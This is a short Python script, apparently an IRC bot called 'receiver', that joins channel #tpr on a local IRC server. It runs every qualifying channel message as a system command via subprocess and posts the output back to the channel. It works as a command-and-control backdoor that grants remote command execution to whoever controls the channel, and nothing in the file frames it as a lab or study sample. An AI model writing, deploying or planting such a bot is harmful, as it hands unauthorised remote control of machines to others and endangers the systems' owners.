from irc_class import *
import os
import random
import subprocess

## IRC Config
server = "127.0.0.1"
port = 6697
channel = "#tpr"
botnick = "receiver"
botnickpass = "botpass"
botpass = "<%= @botpass %>"
irc = IRC()
irc.connect(server, port, channel, botnick, botpass, botnickpass)

while True:
    text = irc.get_response()
    cmd = text.split(':')
    #print(cmd)
    if len(cmd) == 3:
        cmd = cmd[2].strip().replace('-', ' ')
        print("Got this command: " + cmd)
        try:
            if ' ' in cmd:
                cmd = cmd.split(' ')
                print("cmd splitted: " + str(cmd))
                result = subprocess.run(cmd, stdout=subprocess.PIPE)
            else:
                result = subprocess.run([cmd, ], stdout=subprocess.PIPE)
            res = "".join(result.stdout.decode('utf-8').split())
            irc.send(channel, res)
        except:
            print("Something wrong with the cmd, try again!")
 
    #if "PRIVMSG" in text and channel in text and "hello" in text:
